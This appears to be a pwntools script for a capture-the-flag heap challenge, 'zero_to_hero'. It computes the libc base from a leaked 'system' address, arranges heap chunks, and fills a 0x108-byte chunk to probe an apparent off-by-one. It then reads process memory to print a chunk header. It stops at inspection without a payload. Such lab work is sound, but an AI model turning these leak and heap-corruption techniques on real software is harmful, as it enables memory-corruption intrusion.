from pwn import *

context.binary = ELF("./zero_to_hero", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
PROMPT = b"> "
ARR = 0x602060

def start():
    return process(["./ld-2.29.so", "./zero_to_hero"], env={"LD_PRELOAD": "./libc.so.6"})

p = start()
p.recvuntil(b"hero?\n")
p.sendline(b"y")
p.recvline(); p.recvline()
leak_line = p.recvline()
libc.address = int(leak_line.split(b": ")[1], 16) - libc.symbols['system']
p.recvuntil(PROMPT)

for size in (0x108, 0x100, 0x100, 0x80):
    p.sendline(b"1")
    p.recvuntil(b"description?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"description: ")
    p.send(b"A"*size)
    p.recvuntil(PROMPT)

p.sendline(b"2"); p.recvuntil(b"remove?\n"); p.sendline(b"0"); p.recvuntil(PROMPT)

p.sendline(b"1"); p.recvuntil(b"description?\n"); p.sendline(str(0x108).encode()); p.recvuntil(b"description: ")
p.send(b"B"*0x108)
p.recvuntil(PROMPT)

with open(f"/proc/{p.pid}/mem", "rb", 0) as mem:
    mem.seek(ARR)
    arr = [u64(mem.read(8)) for _ in range(7)]

chunk1 = arr[1]
with open(f"/proc/{p.pid}/mem", "rb", 0) as mem:
    mem.seek(chunk1 - 8)
    header = mem.read(16)
prev_size = u64(header[:8])
size = u64(header[8:16])
print(hex(chunk1), hex(prev_size), hex(size))

p.close()
